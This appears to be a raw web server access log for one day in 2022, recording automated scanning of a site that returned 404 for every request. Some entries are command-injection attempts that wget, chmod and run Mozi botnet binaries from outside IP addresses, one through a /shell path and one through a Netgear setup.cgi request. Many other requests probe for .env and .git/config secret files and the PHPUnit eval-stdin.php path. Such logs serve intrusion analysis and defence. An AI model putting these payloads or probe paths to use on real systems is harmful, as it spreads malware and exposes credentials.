::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::1 - - [29/Jun/2022:13:25:33 +0000] "GET /conf/.env HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:33 +0000] "GET /wp-content/.env HTTP/1.0" 404 154 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:33 +0000] "GET /wp-admin/.env HTTP/1.0" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:33 +0000] "GET /library/.env HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:33 +0000] "GET /new/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:33 +0000] "GET /vendor/.env HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:33 +0000] "GET /old/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:33 +0000] "GET /local/.env HTTP/1.0" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:33 +0000] "GET /api/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:34 +0000] "GET /blog/.env HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:34 +0000] "GET /crm/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:34 +0000] "GET /admin/.env HTTP/1.0" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:34 +0000] "GET /laravel/.env HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:34 +0000] "GET /app/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:34 +0000] "GET /app/config/.env HTTP/1.0" 404 154 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:34 +0000] "GET /apps/.env HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:34 +0000] "GET /audio/.env HTTP/1.0" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:34 +0000] "GET /cgi-bin/.env HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:34 +0000] "GET /backend/.env HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:35 +0000] "GET /src/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:35 +0000] "GET /base/.env HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:35 +0000] "GET /core/.env HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:35 +0000] "GET /vendor/laravel/.env HTTP/1.0" 404 158 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:35 +0000] "GET /storage/.env HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:35 +0000] "GET /protected/.env HTTP/1.0" 404 153 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:35 +0000] "GET /newsite/.env HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:35 +0000] "GET /www/.env HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:35 +0000] "GET /sites/all/libraries/mailchimp/.env HTTP/1.0" 404 173 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:35 +0000] "GET /database/.env HTTP/1.0" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:36 +0000] "GET /public/.env HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:36 +0000] "GET /159.223.82.71/.env HTTP/1.0" 404 157 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:36 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:13:25:36 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 189 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
::1 - - [29/Jun/2022:14:05:56 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:14:05:57 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:14:31:57 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.61.134.207:40548/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::1 - - [29/Jun/2022:14:43:37 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:14:43:37 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:15:36:04 +0000] "HEAD / HTTP/1.0" 404 140 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:127.0.0.1 - - [29/Jun/2022:16:23:32 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:16:23:32 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:16:38:07 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:16:38:08 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:17:05:35 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:17:05:37 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:17:16:31 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [29/Jun/2022:17:42:15 +0000] "HEAD / HTTP/1.0" 404 140 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:127.0.0.1 - - [29/Jun/2022:17:57:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.37"
::1 - - [29/Jun/2022:18:01:07 +0000] "GET / HTTP/1.0" 404 139 "-" "https://gdnplus.com:Gather Analyze Provide."
::1 - - [29/Jun/2022:18:43:37 +0000] "GET /c/ HTTP/1.0" 404 141 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:19:04:10 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::1 - - [29/Jun/2022:19:55:23 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:20:06:18 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:20:06:18 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:20:14:06 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.22.0"
::1 - - [29/Jun/2022:20:35:58 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.22.0"
::ffff:127.0.0.1 - - [29/Jun/2022:20:44:58 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [29/Jun/2022:21:07:46 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Jun/2022:21:14:05 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [29/Jun/2022:21:41:10 +0000] "HEAD / HTTP/1.0" 404 140 "-" "-"
::ffff:127.0.0.1 - - [29/Jun/2022:21:41:10 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Jun/2022:22:19:49 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:22:38:50 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [29/Jun/2022:23:07:06 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:23:07:08 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
